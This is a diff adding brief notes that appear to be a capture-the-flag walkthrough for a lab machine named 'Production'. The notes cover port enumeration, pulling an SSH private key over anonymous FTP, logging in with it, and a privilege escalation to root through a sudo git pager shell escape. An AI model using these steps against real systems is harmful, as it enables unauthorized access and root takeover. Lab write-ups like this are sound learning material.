@@ -1,0 +1,36 @@
+Production:
+Enum
+21 - vsftpd 3.0.3
+22 - ssh 7.2
+139 - samba 3.x or 4.x
+445 - samba 3.x or 4.x
+9001
+9002
+9999
+FTP
+Anonymous login only
+ftp <server> 21
+“anonymous”
+get authorized_keys
+get id_rsa
+get flag.txt
+In kali
+chmod 600 id_rsa
+ssh -i id_rsa ashu@<server>
+id
+ashu
+
+ashu
+sudo -l
+notice u can su to skidy
+su skidy
+id
+skidy
+sudo -l
+use git?
+
+skidy
+sudo git -p help config
+!/bin/bash
+id
+root
